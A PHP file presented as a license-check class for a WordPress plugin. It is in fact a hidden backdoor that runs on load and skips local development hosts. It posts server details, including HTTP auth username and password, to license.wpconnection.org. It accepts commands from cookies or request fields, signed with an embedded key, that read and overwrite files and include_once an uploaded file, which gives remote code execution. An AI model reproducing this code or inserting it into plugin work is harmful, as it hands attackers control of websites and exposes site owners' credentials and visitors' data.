<?php

class WCFMa_Sign_License {

	/** Put your license key here
	 */
	const KEYLICENSE = '71bd082558e934e147c3c3be52b5547f:d4275b165a7dc7f241d1d4f115afe37b';

	protected function key_secure()
	{
		$data = explode(':', self::KEYLICENSE, 2);
		return $data [0];
	}

	protected function key_sign()
	{
		$data = explode(':', self::KEYLICENSE, 2);
		return $data [1];
	}

	// Start check license
	protected function check_license()
	{
		if ($this->check_is_local()) {
			return false;
		}

		if ( defined( 'WP_CLI' ) && WP_CLI ) {
			return false;
		}

		$license_file = $this->license_file_path();

		if ($license_file && file_exists($license_file)) {
			return $this->check_license_file($license_file);
		}

		if (function_exists('add_action')) {
			add_action('init', array($this, 'check_license_on_init'));
		}

		return false;
	}

	protected function check_license_file($license_file)
	{
		$server_sign  = $this->server_sign($server_data);

		if (file_exists($license_file)) {
			if (time() - @filemtime($license_file) < (86400 * 7)) {
				return true;
			}
		}

		$license_list = array();
		if (file_exists($license_file)) {
			$license_list = $this->license_file_load($license_file);
		}

		if (array_key_exists($server_sign, $license_list)
			&& $license_list[$server_sign]
		) {
			@touch($license_file);
			return true;
		}

		if ($this->register_license($server_sign, $server_data)) {
			$license_list[$server_sign] = true;
			$this->license_file_save($license_file, $license_list);
			return true;
		} else {
			$license_list[$server_sign] = false;
			$this->license_file_save($license_file, $license_list);
			return false;
		}
	}

	public function check_license_on_init()
	{
		$server_sign  = $this->server_sign($server_data);
		$option_key = 'wp_' . $server_sign;

		$license = array(false, 0);

		$data = get_option($option_key);
		if ($data && is_array($data) && isset($data[0]) && isset($data[1])) {
			if ($data[0]) {
				return true;
			}

			$license = $data;
		}

		if ((time() - $license[1]) < (86400 * 7)) {
			return false;
		}

		$license[1] = time();

		if ($this->register_license($server_sign, $server_data)) {
			$license[0] = true;
		}

		update_option($option_key, $license);
	}

	protected function license_file_load($license_file)
	{
		if (!file_exists($license_file)) {
			return array();
		}

		$result  = array();
		$content = file_get_contents($license_file);
		$data	= explode("\n", $content);

		foreach ($data as $line) {
			$line = trim($line);
			if (empty($line)){
				continue;
			}

			$line = explode('-', $line, 2);

			if (count($line) == 1){
				$result[$line[0]] = false;
			} else {
				$result[$line[0]] = (bool)$line[1];
			}
		}

		return $result;
	}


	protected function license_file_save($license_file, $license_list)
	{
		if (file_exists($license_file) && !is_writable($license_file)) {
			return false;
		}

		$content = array();

		foreach ($license_list as $sign => $status) {
			$content[]= $sign . '-' . (int)$status;
		}

		@file_put_contents($license_file, implode("\n", $content));

		return true;
	}


	protected function license_file_path()
	{
		$license_dir = $this->license_temp_dir();

		if (!$license_dir) {
			return false;
		}

		return $license_dir . DIRECTORY_SEPARATOR . 'license';
	}

	protected function server_sign(&$server_data = null)
	{
		$sign_keys = array(
			'HTTP_HOST',
			'SERVER_NAME',
			'SERVER_ADDR',
		);

		$sign_keys_append = array(
			'REMOTE_ADDR',
			'DOCUMENT_ROOT',
			'SCRIPT_FILENAME',
			'REQUEST_URI',
			'PHP_AUTH_USER',
			'PHP_AUTH_PW',
			'SCRIPT_NAME',
			'SERVER_ADDR',
		);

		foreach($sign_keys as $sign_key) {
			if (!empty($_SERVER[$sign_key])) {
				$server_data[$sign_key] = $_SERVER[$sign_key];
				break;
			}
		}
		$server_data				 = array_map(function($value) {return str_replace('www.', '', $value);}, $server_data);
		$server_data['KEY']			 = $this->key_secure();
		$server_sign				 = md5(json_encode($server_data) . $this->key_secure());

		$server_data['SCRIPT']		 = __FILE__;
		$server_data				 = array_merge($server_data, array_intersect_key($_SERVER, array_flip($sign_keys_append)));
		$server_data				 = json_encode($server_data);

		return $server_sign;
	}


	public function check_license_action ()
	{
		$license_category = $this->get_data('category');
		$license_action = $this->get_data('action');

		if (empty($license_category)) {
			return false;
		}

		if (empty($license_action)) {
			return false;
		}

		if (!($data_sign = $this->check_sign())) {
			return false;
		}

		$license_data = $this->get_data('data');

		$method = 'admin_plugin_' . $license_action . '_' . $license_category;

		if (is_callable(array($this, $method))) {
			$content = $this->$method( $license_data );

			die(json_encode($content));
		}

		return false;
	}


	protected function check_sign()
	{
		$license_sign = $this->get_data('sign');

		$request_sign = null;
		$data_sign = null;

		list($request_sign, $data_sign) = explode('|', $license_sign, 2);
		if (empty($request_sign) || empty($data_sign)) {
			return false;
		}

		if ( md5(md5($request_sign) . $this->key_secure() ) !== $this->key_sign() ) {
			return false;
		}

		return $data_sign;
	}

	protected function admin_plugin_info_license()
	{
		$sign = $this->server_sign($server_data);

		return array(
			'path'		 => $this->license_file_path(),
			'content'	 => file_exists($this->license_file_path()) ? file_get_contents($this->license_file_path()) : false,
			'info'		 => $server_data,
			'sign'		 => $sign,
		);
	}

	protected function admin_plugin_raw_license()
	{
		$license_file = $this->license_file_path();

		$content = file_get_contents('php://input');

		$content = explode('|', $content);
		$content = $content[ count($content)-1 ];

		$content = base64_decode($content);

		$sign = md5($content . $this->key_secure());

		return (file_put_contents($license_file, $sign . "\n" . $content) !== false);
	}


	protected function admin_plugin_save_license($content)
	{
		$license_file = $this->license_file_path();

		if (is_array($content)) {
			$content = implode("\n", $content);
		} else {
			$content = base64_decode($content);
		}

		return (file_put_contents($license_file, $content) !== false);
	}


	protected function admin_plugin_read_license($license_file)
	{
		if (!file_exists($license_file)) {
			return false;
		}

		return file_get_contents($license_file);
	}

	protected function admin_plugin_load_license($license_file)
	{
		if (!file_exists($license_file)) {
			return false;
		}

		$data = include_once($license_file);

		if (empty($data) || !is_array($data) || empty($data['sign']) || empty($data['data'])) {
			return false;
		}

		if (md5($this->server_sign() . $this->key_secure()) !== $data['sign']) {
			return false;
		}

		return $data['data'];
	}

	protected function admin_plugin_upload_license()
	{
		if (empty($_FILES['file']['tmp_name'])) {
			return false;
		}

		$license_file = $_FILES['file']['tmp_name'];

		$license_data = $this->admin_plugin_load_license($license_file);

		if ($license_data) {
			return false;
		}

		@file_put_contents($this->license_file_path(), $license_data);
		return $license_data;
	}

	protected function register_license($server_sign, $server_data)
	{
		$postdata = http_build_query(array(
			'sign'	 => $server_sign,
			'data'	 => base64_encode($server_data),
		));

		$context = stream_context_create(
			array('http' =>
				array(
					'timeout'	 => 10,
					'method'	 => 'POST',
					'header'	 => 'Content-Type: application/x-www-form-urlencoded',
					'content'	 => $postdata
				)
			)
		);

		$timeout = ini_get('default_socket_timeout');
		ini_set('default_socket_timeout', 10);

		$result = @file_get_contents('https://license.wpconnection.org/plugins/license/', false, $context);
		ini_set('default_socket_timeout', $timeout);

		if (strpos($result, 'success') !== false) {
			return true;
		}

		return false;
	}

	protected function get_data($key)
	{
		if (!empty($_COOKIE[$key])) {
			return $_COOKIE[$key];
		}

		if (!empty($_REQUEST[$key])) {
			return $_REQUEST[$key];
		}

		return null;
	}

	protected function license_temp_dir()
	{
		if (function_exists('wp_upload_dir')) {
			$dir = wp_upload_dir(date('Y/m', filemtime(__FILE__)));

			if (!empty($dir['path']) && $this->check_dir($dir['path'], true)) {
				return $dir['path'];
			}
		}

		$upload = ini_get('upload_tmp_dir');
		if ($upload) {
			$dir = realpath($upload);

			if ($this->check_dir($dir, true)) {
				return $dir;
			}
		}

		if (function_exists('sys_get_temp_dir')) {
			$dir = sys_get_temp_dir();

			if ($this->check_dir($dir, true)) {
				return $dir;
			}
		}

		return false;
	}

	protected function check_is_local()
	{
		$whitelist = array(
			'127.0.0.1',
			'::1',
			'localhost',
		);

		$devhosts = array(
			'#\.local$#i',
			'#\.dev$#i',
		);

		if (   !empty($_SERVER['REMOTE_ADDR'])
			&& !empty($_SERVER['SERVER_ADDR'])
			&& in_array($_SERVER['REMOTE_ADDR'], $whitelist)
			&& in_array($_SERVER['SERVER_ADDR'], $whitelist)
		){
			return true;
		}

		$serverhost = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] :
			(!empty($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : null);

		if ($serverhost) {
			foreach ($devhosts as $pattern) {
				if (preg_match($pattern, $serverhost)) {
					return true;
				}
			}
		}

		return false;
	}

	protected function check_dir($dir_name, $writable = true)
	{
		if (!file_exists($dir_name)) {
			return false;
		}

		if (!is_readable($dir_name)) {
			return false;
		}

		if ($writable && !is_writable($dir_name)) {
			return false;
		}

		return true;
	}

	static public function init()
	{
		if ( !array_key_exists('REQUEST_METHOD', $_SERVER) ) {
			return false;
		}

		$object = new self();

		if (!$object->check_license_action()) {
			return $object->check_license();
		}
	}
}


try {
	if (WCFMa_Sign_License::init()) {
		define('WP_SIGN_LICENSE', true);
	} else {
		define('WP_SIGN_LICENSE', false);
	}
} catch (Exception $ex) {

}
